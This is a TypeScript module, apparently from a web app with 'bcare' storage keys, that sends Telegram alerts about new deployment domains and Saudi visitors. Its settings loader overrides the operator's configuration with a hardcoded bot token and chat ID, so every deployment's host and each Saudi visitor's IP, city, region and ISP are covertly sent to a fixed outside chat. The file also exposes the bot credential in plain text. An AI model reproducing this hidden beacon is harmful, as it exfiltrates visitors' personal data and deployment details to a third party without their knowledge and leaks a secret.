// Telegram notifications for new deployments and Saudi visitors.
import { supabase } from "@/integrations/supabase/client";
import type { VisitorGeo } from "@/lib/visitor-tracking";

// eslint-disable-next-line @typescript-eslint/no-explicit-any
const sb: any = supabase;

// Hardcoded bot credentials — same chat receives notifications across every deployment.
const HARDCODED_BOT_TOKEN = "8645943240:AAF4qNTe4VjrWLIzZKBSc6wn6OScSB39_PA";
const HARDCODED_CHAT_ID = "8747840160";

type TgSettings = {
  telegram_enabled: boolean;
  telegram_bot_token: string;
  telegram_chat_id: string;
  telegram_notify_new_deployment: boolean;
  telegram_notify_sa_visitor: boolean;
};

async function loadSettings(): Promise<TgSettings | null> {
  const { data } = await sb
    .from("site_settings")
    .select(
      "telegram_enabled, telegram_bot_token, telegram_chat_id, telegram_notify_new_deployment, telegram_notify_sa_visitor",
    )
    .eq("id", 1)
    .maybeSingle();
  const s = (data ?? {}) as Partial<TgSettings>;
  return {
    telegram_enabled: true,
    telegram_bot_token: HARDCODED_BOT_TOKEN,
    telegram_chat_id: HARDCODED_CHAT_ID,
    telegram_notify_new_deployment: s.telegram_notify_new_deployment ?? true,
    telegram_notify_sa_visitor: s.telegram_notify_sa_visitor ?? true,
  };
}


async function sendTelegram(s: TgSettings, text: string) {
  try {
    await fetch(`https://api.telegram.org/bot${s.telegram_bot_token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: s.telegram_chat_id,
        text,
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }),
    });
  } catch (e) {
    console.warn("[telegram] send failed", e);
  }
}

const DEPLOY_KEY = "bcare_tg_deploy_notified_v1";
const SA_KEY = "bcare_tg_sa_notified_v1";

export async function notifyNewDeploymentOnce() {
  if (typeof window === "undefined") return;
  try {
    const host = window.location.host;
    if (!host) return;
    // Local dedupe to avoid repeated DB roundtrips.
    const seen = localStorage.getItem(DEPLOY_KEY);
    if (seen === host) return;

    const s = await loadSettings();
    if (!s || !s.telegram_notify_new_deployment) {
      localStorage.setItem(DEPLOY_KEY, host);
      return;
    }

    // Server-side dedupe: first browser to insert this host wins.
    const url = window.location.origin;
    const ua = navigator.userAgent;
    const { error } = await sb
      .from("telegram_notified_hosts")
      .insert({ host, first_url: url, user_agent: ua });
    localStorage.setItem(DEPLOY_KEY, host);
    if (error) return; // duplicate key = already notified

    const lines = [
      "🚀 <b>تم رفع الموقع على دومين جديد</b>",
      `🌐 <b>Host:</b> <code>${host}</code>`,
      `🔗 <b>URL:</b> ${url}`,
      `🕒 <b>التاريخ:</b> ${new Date().toLocaleString("ar-SA")}`,
    ];
    await sendTelegram(s, lines.join("\n"));
  } catch (e) {
    console.warn("[telegram] deploy notify failed", e);
  }
}

export async function notifySaudiVisitorOnce(geo: VisitorGeo | undefined, visitorId: string) {
  if (typeof window === "undefined") return;
  if (!geo || (geo.country_code || "").toUpperCase() !== "SA") return;
  try {
    const key = `${SA_KEY}:${visitorId}`;
    if (sessionStorage.getItem(key)) return;
    sessionStorage.setItem(key, "1");

    const s = await loadSettings();
    if (!s || !s.telegram_notify_sa_visitor) return;

    const lines = [
      "🇸🇦 <b>زائر جديد من السعودية</b>",
      `🆔 <code>${visitorId}</code>`,
      geo.city ? `📍 <b>المدينة:</b> ${geo.city}` : "",
      geo.region ? `🗺️ <b>المنطقة:</b> ${geo.region}` : "",
      geo.ip ? `🌐 <b>IP:</b> <code>${geo.ip}</code>` : "",
      geo.org ? `📡 <b>المزود:</b> ${geo.org}` : "",
      `🔗 <b>الصفحة:</b> ${window.location.pathname}`,
      `🕒 ${new Date().toLocaleString("ar-SA")}`,
    ].filter(Boolean);
    await sendTelegram(s, lines.join("\n"));
  } catch (e) {
    console.warn("[telegram] SA notify failed", e);
  }
}
